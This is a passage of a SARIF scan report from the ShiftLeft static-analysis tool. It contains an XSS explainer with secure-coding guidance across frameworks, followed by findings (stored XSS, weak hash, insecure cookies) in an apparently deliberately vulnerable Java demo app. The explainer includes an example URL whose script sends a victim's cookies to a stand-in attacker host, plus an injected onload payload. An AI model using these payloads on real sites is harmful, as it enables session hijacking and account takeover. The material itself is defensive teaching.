                "markdown": "Attacker-Controlled data is used as HTML content. This indicates a Cross-Site-Scripting (XSS) vulnerability.\n\n# Cross-Site Scripting\n\nA **Cross-site scripting** (XSS) vulnerability allows an attacker to execute\nJavaScript code in an HTML document rendered by a victim. As a result, the\nattacker can then for example impersonate the victim user to perform arbitrary actions\nprovided by the web application, or exfiltrate and modify sensitive data that is otherwise only accessible to the victim.\n\n## Anatomy of an XSS Attack\n\nThe nature of web applications requires them to process and handle HTML content, which often dynamically incorporates external data. Applications must correctly escape or sanitize all such dynamic content to prevent **XSS attacks**. The most common types of XSS vulnerabilities are:\n\n### Reflected XSS\n\nReflected Cross-Site scripting attack happens in multiple steps:\n\n1. An attacker gets a victim to send data of the attacker's choosing to a website - for example by redirecting them to a URL of\n   the attacker's choosing.\n2. The application includes this untrusted data in an HTML document it sends in response (*reflecting* the data), without taking correct steps to disarm it.\n3. The victim's browser executes JavaScript code of the attacker's choosing.\n\nAs an example let's take a web application that displays the contents of the `search` query parameter in the URL. When an attacker sends a link to a victim to get them to visit a URL like\n\n    https://your-website.invalid/?search=<script>location.href=\"https://attacker-owned.invalid/?\"+document.cookie</script>\n\nIf the HTML response contains this `<script>` tag as-is and the victim clicks on the link, the victim's browser executes this JavaScript code. The JavaScript snippet in this example sends the victim's cookies on your website back to the attacker - on many sites that allows the attacker to take over the active log-in of the victim and impersonate them.\n\n\n### Stored XSS\n\nA Stored Cross-Site Scripting vulnerability happens when the following things come together:\n\n1. An application persists / stores untrusted data, for example in a database. An attacker gets the application to store some HTML and JavaScript code.\n2. The application later retrieves this stored data and includes it as part of an HTML document. (And the application does not take correct steps to disarm the attacker-controlled data.)\n3. A victim views such an HTML page. Their browser executes the attacker-chosen JavaScript code.\n\nFor example, a social-network type website may allow users to set the avatar that is displayed next to their name on their profile or next to their posts to an arbitrary URL of an image file. This website stores this URL in a database and includes the URL as-is in an HTML tag `<img src=\"...\">`. An attacker with user-id `1337` specifies this URL for their avatar:\n\n    https://somewhere.invalid/their-picture.jpg\" onload=\"addUserToFriendsList(1337)\n\nto get the application to generate this resulting HTML code:\n\n```html\n<img src=\"https://somewhere.invalid/their-picture.jpg\" onload=\"addUserToFriendsList(1337)\">\n```\n\nWhenever someone looks at the profile of the attacker, their browser executes the JavaScript code that adds the attacker to the victim's friend list without further user interaction.\n\n\n### DOM-Based XSS\n\nWith **DOM-based XSS vulnerabilities** the HTML code that is generated in the backend is safe by itself. Instead, the vulnerability is in JavaScript frontend code that inserts untrusted data into the browser **Document Object Model** (DOM) in an insecure manner.\n\nA **DOM-based XSS vulnerability** can be either **reflected** or **stored** - depending on how the untrusted data is transmitted by an attacker.\n\nWe can revisit the social-network example for **stored XSS** - a site that uses a JavaScript snippet like this would be vulnerable to the same attack:\n\n```javascript\n$.get(\"user/1337/profile\", res => $(\"#avatar\").html(`<img src=\"${res.avatarURL}\">`));\n```\n\n(This snippet performs an HTTP GET request to request the user's profile information. It insecurely includes the result when rendering a snippet of HTML.)\n\n### Cross-Site Scripting Beside the Web\n\nApplications that are not websites at all still often use HTML (or related technologies that are also susceptible to XSS) to display formatted text to users - whether they are mobile applications, desktop applications or embedded. These applications must be just as careful when including dynamic data in the HTML they generate.\n\nIn fact, the impact of an XSS attack against such applications is often even more disastrous. The HTML views such applications use are generally not meant to protect the application or user against malicious JavaScript. Instead, they have powerful non-standard JavaScript APIs that can allow an attacker to take complete control of the application and computer.\n\nThere are endless potential scenarios for such problems. Here are some examples to spark your imagination:\n\n- a messenger app executing scripts within messages from other users\n- an ebook reader executing JavaScript from code samples in a book about JavaScript\n- a Wi-Fi network selection list names executing scripts from the name of access points\n\nThe root problem is the same as for websites - whenever you include dynamic content in HTML and the source of this dynamic data cannot be trusted 100%, XSS attacks can happen. And on the flip-side, the same techniques and best practices protect against such vulnerabilities.\n\n## Preventing XSS Attacks\n\nThere are multiple approaches to prevent XSS attacks.\n\nBest practice is to use **secure-by-default web frameworks and templating engines** for generating or modifying HTML. For these you only need to think about the possibility of a XSS vulnerability because data is not fully trusted in the places where explicitly output raw HTML.\n\nThe next-best option is to manually HTML-**escape** all dynamic data that you include in an HTML document. This approach is secure in principle but has several downsides:\n\n- it is easy to forget to escape some untrusted data - even if you remember to do it correctly *almost* everywhere\n- untrusted inputs can take very long-winded paths before getting output again - a developer just needs to overlook one such path to fool themselves to think escaping is not needed when it actually is\n- it violates the don't-repeat-yourself (DRY) principle, requiring boilerplate code in every place an application adds dynamic data to HTML content\n\nWhen you decide to use escaping, be wary of when you escape data from untrusted inputs: subsequent encoding, decoding or other text manipulation operations on already-escaped strings can inadvertently reintroduce some way for an attacker to thwart the protection from that earlier HTML-escaping operation - it is therefore generally best to wait until the last possible moment to do HTML-escaping.\n\nSometimes you have text that is not fully trusted and is already in HTML format. The previous options do not work in that case. Instead, you need to **sanitize** the HTML so that benign HTML formatting is passed through but nothing that can be abused by an attacker. This should be an **option of last resort**. Attackers regularly come up with novel ways to render sanitization useless. If you do go with it, we have a few tips:\n\n- Use a well-known HTML sanitization library! There are many non-obvious ways HTML can contain JavaScript code. Do not believe you know and remember of all of them.\n- Rigorously keep up with updates for the HTML sanitizer you use! Updates will often fix ways attackers can bypass the sanitization, or add support for some new browser features that in some way can lead to JavaScript execution.\n- Be as restrictive as possible! HTML sanitization libraries can generally be configured as to which HTML constructs should be allowed and which should not. Give attackers as little wiggle-room to find a way around the sanitization as possible.\n- Use mitigations for Cross-Site Scripting from the next section.\n\n\n## Mitigating Cross-Site Scripting Attacks\n\nThere are several things you can do to lower the impact of XSS vulnerabilities but not quite to the point of solving the problem completely. You should not rely on them as sole protection, yet they are a useful defense-in-depth measure in case something goes wrong.\n\nYou can use the `Content-Security-Policy` (CSP) HTTP header to instruct browsers not to execute JavaScript code except in places you explicitly allow. A restrictive **Content Security Policy** is effective in stopping XSS attacks in otherwise vulnerable websites. But sufficiently restrictive policies also disable many useful features of the web platform. As a result, policies seen in practice often still allow some subset of attacks to go through. Try to remain as strict as possible in what you allow in your **content security policies**.\n\nWhen you know you show HTML content to users that you do not fully trust (e.g. you used sanitization or sourced it from a partner company), consider loading it within an `<iframe>` with the `sandbox` attribute. This attribute allows you to instruct the browser to disable various dangerous features and allows you to limit the ways content inside the **sandbox** can interact with your regular site. \n\nXSS filters in browsers, middleware or application firewalls have severe limitations. They can provide some protection against well-known exploits in off-the-shelf software. But attackers regularly find ways to bypass these tools. Most browsers have removed or never implemented builtin XSS filters because there actually are cases where they create vulnerabilities in sites that are otherwise secure. Similar problems fundamentally also apply to server-side filters when they don't just block possible exploit attempts but are supposed to neutralize them.\n\n\n::::tabs\n\n:::tab[Java]\n\n## XSS Protection in JSP\n\nJava Server Pages (JSP) do **not** protect against Cross-Site Scripting by default. The following example is vulnerable to XSS attacks if users can freely choose their names:\n\n```html\n<h1>Hello, ${user.name}</h1><!-- bad: users can inject HTML code here -->\n```\n\nInstead, in JSP you must use one of these two more verbose ways to output dynamic data in order to prevent XSS attacks:\n\n```html\n<%@ taglib uri=\"http://java.sun.com/jsp/jstl/core\" prefix=\"c\" %>\n<h1>Hello, <c:out value=\"${user.name}\"/></h1>\n```\n\n```html\n<%@ taglib uri=\"http://java.sun.com/jsp/jstl/functions\" prefix=\"fn\" %>\n<h1>Hello, ${fn:escapeXml(user.name)}</h1>\n```\n\nNote that a lot of information from the JSP and servlet context is attacker-controlled, so don't forget to escape this data.\n\n## XSS Protection in Regular Java\n\nIf your code manually constructs HTML (e.g. in a servlet) you need to escape any dynamic content before writing it. For example, you may use \n`org.apache.commons.lang.StringEscapeUtils.escapeHtml()` method from the Apache \n`commons-lang` library or the `org.springframework.web.util.HtmlUtils` class from the Spring framework for that purpose.\n\n:::\n\n:::tab[Angular]\n\n## XSS Protection in Angular\n\nAngular is safe by default and escapes all dynamic values automatically. The\nexception are the `bypassSecurityTrust*` functions in the `DomSanitizer` object.\nCarefully audit every use of these functions to make sure they are not used with\nuntrusted input.\n\nUsing these functions with untrusted data immediately opens the door to XSS\nattacks:\n\n```typescript\nimport { Component, OnInit } from '@angular/core';\nimport {DomSanitizer} from '@angular/platform-browser'\n\n@Component({\n  selector: 'component-with-dom-sanitizer',\n  template: '<div [innerHTML]=\"html\"></div>', // include HTML content from 'this.html'\n})\nexport class ComponentWithDomSanitizer implements OnInit {\n  html: SafeHtml;\n\n  constructor(private sanitizer: DomSanitizer) {}\n\n  ngOnInit(): void {\n    // never use with untrusted/partially trusted input!\n    // if you are uncertain, prefer this.sanitizer.sanitize()\n    this.html = this.sanitizer.bypassSecurityTrustHtml('<img src=\"broken\" onerror=\"alert(\\'Hello XSS!\\')\">') ;\n  }\n}\n```\n\n:::\n\n:::tab[C#]\n\n## XSS Protection in C#\n\nThe Razor template language escapes dynamic content automatically when using the @ symbol for interpolation. The following snippet writes out the untrusted input as `&lt;&quot;script&quot;&gt;` when rendering the HTML, safely defusing any\npotential XSS attacks:\n\n```html\n@{\n    var untrustedInput = \"<\\\"script\\\">\";\n}\n\n<h1>@untrustedInput</h1>\n```\n\nThis can be overridden using the `Html.Raw()` method - opening up the possibility of XSS attacks:\n\n```html\n<!-- this is vulnerable to XSS -->\n<div data-url=\"@Html.Raw(untrustedInput)\"></div>\n```\n\nCarefully audit every use of `Html.Raw()` to make sure it is not used with untrusted data.\n\n### Manual Escaping\n\nIf you are constructing HTML outside a template you must remember to manually\nHTML-escape dynamic data. One option for this is the `System.Web.HttpUtility.HtmlEncode()` method.\n\n:::\n\n:::tab[Go]\n\n## XSS Protection in Go\n\nThe `html/template` package is safe by default, automatically escaping dynamic content. For example, the following snippet:\n\n```go\nimport \"html/template\"\n\nt, err := template.New(\"template\").Parse(`{{define \"T\"}}Hello, {{.}}!{{end}}`)\nerr = t.ExecuteTemplate(out, \"T\", \"<script>alert('Hacked!')</script>\")\n```\n\n...writes escaped HTML to the `out` variable. This is in contrast to the `text/template` package which does not provide\nsuch protection.\n\n### Manual Escaping\n\nIf you are constructing HTML outside a template you must remember to manually\nHTML-escape dynamic data. You can use the `html/template.HTMLEscapeString()` function\nfor this.\n\n:::\n\n:::tab[JavaScript]\n\n## XSS Protection in JavaScript\n\nMany template languages escape dynamic content by default, unless you add a directive telling them not to. For instance,\nthe Nunjucks\ntemplate language automatically escapes anything between curly braces:\n\n```\n<!-- Will print &lt;script&gt; in the HTML. -->\n{{ \"<script>\" }}\n```\n\nThis behavior can be overridden, however, creating the possibility of vulnerabilities. In Nunjucks, one way\nof doing this are by using the `safe` keyword (which tells the template engine you consider the source trustworthy):\n\n```\n<!-- Will print <script> in the HTML, which is not safe! -->\n{{ \"<script>\" | safe }}\n```\n\nAnother way such templates become vulnerable is when HTML-escaping is disabled globally:\n\n```javascript\n// bad: this asks for your app to be vulnerable to XSS attacks\nnunjucks.configure({ autoescape: false });\n```\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings you need to escape any dynamic\ncontent manually. One way of doing this by using the `escape-html` Node module:\n\n```javascript\nconst escape = require('escape-html')\nconst html   = escape('<script>')     // Will return &lt;script&gt;\n```\n\n:::\n\n:::tab[Python]\n\n## XSS Protection in Python\n\nMost Python template languages escape dynamic content by default unless you add a directive telling them not to. For instance,\nJinja2 template language automatically escapes anything between curly braces:\n\n```\n<!-- Will print &lt;script&gt; in the HTML. -->\n{{ \"<script>\" }}\n```\n\nTemplate languages allow this behavior to be overridden, however, which can create an XSS vulnerability. In Jinja2, this is done with the `safe` keyword (which tells the template engine you consider the source trustworthy):\n\n```\n<!-- Will print <script> in the HTML, which is not safe! -->\n{{ \"<script>\" | safe }}\n```\n\nAnother way your templates can become vulnerable is by adding the `{% autoescape false %}` directive, which disables escaping for the whole template. Avoid using it.\n\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings, you are responsible for escaping any\ndynamic content possibly coming from an untrusted source. In Python, the builtin `html` module provides the `escape()` function for this purpose:\n\n```python\nimport html\n\n# Will return &lt;script%gt;\nhtml.escape(\"<script>\")\n```\n\n:::\n\n:::tab[React]\n\n## XSS Protection in React\n\nBy default, React escapes any dynamic content you use to construct elements. For example, if some malicious\nJavaScript is passed in the malicious query string parameter, the following snippet is *still* safe:\n\n```jsx\nimport useSearchParams from 'react-router-dom'\n\nfunction SearchBar() {\n  const [searchParams, setSearch] = useSearchParams();\n  const searchParam = searchParams.get(\"search\");\n  \n  return (\n    <input type=\"text\" value={search} onChange={updateSearch} className=\"search-bar\" />\n  );\n}\n```\n\nTo disable auto-escaping in React, you would use the property `dangerouslySetInnerHTML`. Only use this with fully trusted or already HTML-escaped data, or your application is vulnerable to XSS attacks.\n\n```jsx\n<div className=\"search-bar\">\n  <!-- vulnerable! -->\n  <div dangerouslySetInnerHTML={{ __html: searchParam }}>\n  </div>\n</div>\n```\n\n\n:::\n\n:::tab[Scala]\n\n## XSS Protection in Scala\n\nMost template languages in Scala escape dynamic content by default. The popular Play framework escapes dynamic\ncontent by default when you use the following form:\n\n```html\n<p>\n  @(article.content)\n</p>\n```\n\nYou can opt out of this protection by using `@Html()`. Due to the dangers of XSS vulnerabilities, carefully audit every use to ensure the data comes from a trusted source or is HTML-escaped in another step.\n\n```html\n<p>\n  <!-- dangerous! -->\n  @Html(article.content)\n</p>\n```\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings you need to escape any dynamic\ncontent before you write it to the output stream. If you use the play framework you can use the `play.api.templates.HtmlFormat.escape()` method for this. Other options are the\n`org.apache.commons.lang.StringEscapeUtils.escapeHtml()` method from the Apache\n`commons-lang` library or the `org.springframework.web.util.HtmlUtils` class from the Spring framework.\n\n\n:::\n\n:::tab[PHP]\n\n## XSS Protection in PHP\n\nIn PHP, HTML is not escaped by default, making it susceptible to Cross-Site Scripting attacks if proper measures are not taken. Below is a simple example demonstrating how one might inadvertently allow for XSS:\n\n```php\n<?php\n$userName = $_GET['username'];\n?>\n<h1>Hello, <?=$userName?></h1> <!-- bad: users can inject HTML or JavaScript here -->\n```\n\nBy directly echoing user input, you expose yourself to potential XSS vulnerabilities. A common string to show that an attack is possible is: `<script>alert('XSS!');</script>`\n\n### Mitigation\n\nIdeally, use a templating engine or frontend framework that protect against XSS by default by requiring special syntax for raw HTML output. The builtin PHP templating has no such protections, but for example the Blade template engine from Laravel does.\n\nWhen you are dealing with legacy code that uses a template engine with insecure defaults, you must remember to manually escape any output that could potentially contain user-controlled data. This is highly discouraged because it is so easy to forget, or overlook an obscure way that attacker-controlled inputs can actually end up in dynamic output. Still, if you have to do it, the most basic way to do this in PHP is using the built-in `htmlspecialchars` function:\n\n```php\n<?php\n$userName = $_GET['username'];\n$safeUserName = htmlspecialchars($userName, ENT_QUOTES, 'UTF-8');\n?>\n<h1>Hello, <?=$safeUserName?></h1> <!-- safe: characters like < and > are converted to their HTML entities -->\n```\n\nBy using `htmlspecialchars`, the input string is made safe for displaying in HTML by converting characters like `<` and `>` into their respective HTML entities (`&lt;` and `&gt;`), preventing them from being interpreted as HTML or JavaScript by the browser.\n\nHowever, ensure you always use `htmlspecialchars` or similar functions whenever you're outputting data that might contain user input, not just in this specific context. Also, use context-aware output functions when working with JavaScript, CSS, or URL parameters to prevent XSS in those contexts.\n\nRemember, avoiding XSS is not only about protecting against `<script>` tags, but also about preventing attackers from manipulating HTML in ways that can lead to data theft, defacement, or other malicious activities.\n\n:::\n\n::::\n\n## CWEs\n\n* [CWE-79](https://cwe.mitre.org/data/definitions/79.html)."
              },
              "name": "LogForging",
              "properties": {
                "tags": [
                  "ng-sast"
                ],
                "precision": "very-high"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "fullDescription": {
                "text": "Attacker-Controlled data is used as HTML content. This indicates a Cross-Site-Scripting (XSS) vulnerability."
              },
              "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
              "shortDescription": {
                "text": "Log Forging"
              }
            }
          ],
          "version": "1.0.0",
          "fullName": "ShiftLeft NextGen Analysis",
          "informationUri": "https://shiftleft.io"
        }
      },
      "conversion": {
        "tool": {
          "driver": {
            "name": "ng-sast"
          }
        },
        "invocation": {
          "arguments": [],
          "executionSuccessful": true,
          "commandLine": "",
          "endTimeUtc": "2025-03-21T22:10:23Z",
          "workingDirectory": {
            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima"
          }
        }
      },
      "invocations": [
        {
          "executionSuccessful": true,
          "endTimeUtc": "2025-03-21T22:10:23Z",
          "workingDirectory": {
            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima"
          }
        }
      ],
      "results": [
        {
          "message": {
            "markdown": "Weak Hash: Usage of Weak Cryptographic Hash Function in `CustomerController.saveSettings`",
            "text": "Weak Hash: Usage of Weak Cryptographic Hash Function in CustomerController.saveSettings"
          },
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 240
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "MODERATE",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 240
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "31128da12fdbde3835ecfc5e8b3cd4d708f7410e5f4013d42362280dd72e28b3"
          },
          "ruleId": "weak-hash-call",
          "ruleIndex": 0
        },
        {
          "message": {
            "markdown": "Security Best Practices: Cookie Sent Without HttpOnly Attribute in `AdminController.doPostLogin`",
            "text": "Security Best Practices: Cookie Sent Without HttpOnly Attribute in AdminController.doPostLogin"
          },
          "level": "note",
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 110
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/AdminController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "LOW",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 110
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/AdminController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "02b3a2175568d4425920675c566057bd97fc5a94c0303b115f9767ecf615732b"
          },
          "ruleId": "cookie-missing-httponly-flag",
          "ruleIndex": 1
        },
        {
          "message": {
            "markdown": "Security Best Practices: Cookie Sent Without Secure Attribute in `AdminController.doPostLogin`",
            "text": "Security Best Practices: Cookie Sent Without Secure Attribute in AdminController.doPostLogin"
          },
          "level": "note",
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 110
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/AdminController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "LOW",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 110
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/AdminController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "2a7c278c3cbdb99a8b1fbca13818371e4e6b7ea76d82d9476821cd2d3891e15b"
          },
          "ruleId": "cookie-missing-secure-flag",
          "ruleIndex": 2
        },
        {
          "message": {
            "markdown": "Cross-Site Scripting: Attacker-controlled, Sensitive Data Stored in Database via `firstName` in `CustomerController.debug`",
            "text": "Cross-Site Scripting: Attacker-controlled, Sensitive Data Stored in Database via firstName in CustomerController.debug"
          },
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 301
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "MODERATE",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 283
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 296
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 19
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 24
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 301
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "d86b9e6169fff1512dd2ac414ea72fa665a927b02876d63931ec00f3331986af"
          },
          "ruleId": "stored-xss",
          "ruleIndex": 3
        },
        {
          "message": {
            "markdown": "Cross-Site Scripting: Attacker-controlled, Sensitive Data Stored in Database via `socialSecurityNum` in `CustomerController.debug`",
            "text": "Cross-Site Scripting: Attacker-controlled, Sensitive Data Stored in Database via socialSecurityNum in CustomerController.debug"
          },
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 301
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "MODERATE",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 287
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 297
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 20
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 28
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 19
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 296
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 301
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "ad0a747ff30508444c617032bb3247c3ba2eec270aa784df8c519d8aad3ca34f"
          },
          "ruleId": "stored-xss",
          "ruleIndex": 3
        },
        {
          "message": {
            "markdown": "Cross-Site Scripting: Attacker-controlled, Sensitive Data Stored in Database via `ssn` in `CustomerController.debug`",
            "text": "Cross-Site Scripting: Attacker-controlled, Sensitive Data Stored in Database via ssn in CustomerController.debug"
          },
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 301
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "MODERATE",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 286
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 297
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 19
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 27
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 296
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 301
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "eb7e3f4f347bb366f8d3609d291e8c4b10b0bc248d8b2106e0e450b051c061e7"
          },
          "ruleId": "stored-xss",
          "ruleIndex": 3
        },
        {
          "message": {
            "markdown": "Cross-Site Scripting: Attacker-controlled, Sensitive Data Stored in Database via `lastName` in `CustomerController.debug`",
            "text": "Cross-Site Scripting: Attacker-controlled, Sensitive Data Stored in Database via lastName in CustomerController.debug"
          },
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 301
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "MODERATE",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 284
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 296
                          },
                          "artifactLocation": {
